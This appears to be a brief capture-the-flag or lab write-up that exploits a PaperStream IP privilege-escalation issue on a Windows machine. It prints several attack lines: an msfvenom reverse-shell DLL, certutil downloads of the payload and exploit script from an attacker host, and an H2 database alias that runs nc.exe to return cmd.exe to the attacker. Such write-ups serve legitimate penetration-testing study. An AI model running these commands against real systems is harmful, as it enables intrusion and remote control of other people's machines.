![Pasted image 20240629184624.png](Evidence/Pasted%20image%2020240629184624.png)

![Pasted image 20240629184723.png](Evidence/Pasted%20image%2020240629184723.png)

machine seems to be broken or misconfigured time to enumerate...


![Pasted image 20240629185002.png](Evidence/Pasted%20image%2020240629185002.png)

I looked up fiscanner and paperstream IP comes up lets enumerate that directory 

in order to run this script I need to be in powershell but I cant toggle it out of any directory besides `System32` 
![Pasted image 20240629190340.png](Evidence/Pasted%20image%2020240629190340.png)

```
msfvenom -p windows/shell_reverse_tcp -f dll -o UninOldIS.dll LHOST=ATTACKER LPORT=8082
```

I created my payload 

and I need to transfer the exploit and the payload to `C:/Windows/Temp/`

![Pasted image 20240629190746.png](Evidence/Pasted%20image%2020240629190746.png)

I transferred both files to the `Temp` directory 

```
certutil -urlcache -split -f http://ATTACKER:80/UninOldIS.dll C:/Windows/Temp/UninOldIS.dll
```

```
certutil -urlcache -split -f http://ATTACKER:80/49382.ps1 C:/Windows/Temp/49382.ps1
```

i triggered the payload and got back a shell...

![Pasted image 20240629192859.png](Evidence/Pasted%20image%2020240629192859.png)

![Pasted image 20240629193154.png](Evidence/Pasted%20image%2020240629193154.png)


```
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Windows/temp/nc.exe ATTACKER 80 -e cmd.exe").getInputStream()).useDelimiter("\\Z").next()');
```